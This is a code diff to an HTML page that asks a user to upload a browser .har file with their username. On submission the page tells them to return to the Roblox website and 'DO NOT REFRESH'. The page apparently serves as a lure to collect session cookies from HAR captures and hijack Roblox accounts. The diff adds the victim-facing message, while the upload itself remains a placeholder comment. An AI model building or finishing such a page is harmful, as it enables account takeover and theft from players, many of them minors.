@@ -76,6 +76,12 @@
       color: red;
       margin-top: 10px;
     }
+
+    #final-message {
+      color: #00e676;
+      font-weight: bold;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
@@ -95,6 +101,7 @@
         <input type="file" id="har-file" accept=".har" hidden />
       </div>
       <button onclick="submitForm()">Submit</button>
+      <p id="final-message"></p>
     </div>
   </div>
 
@@ -139,14 +146,16 @@
     function submitForm() {
       const username = document.getElementById("username").value;
       const file = document.getElementById("har-file").files[0];
+      const finalMessage = document.getElementById("final-message");
 
       if (!username || !file) {
         alert("Please enter a username and select a .har file.");
         return;
       }
 
-      // Placeholder for submission logic (e.g., upload to server or webhook)
-      alert(`Uploading HAR file for user: ${username}`);
+      // Placeholder for actual upload logic
+
+      finalMessage.innerText = "✅ Now go back to the Roblox website and DO NOT REFRESH.";
     }
   </script>
 </body>
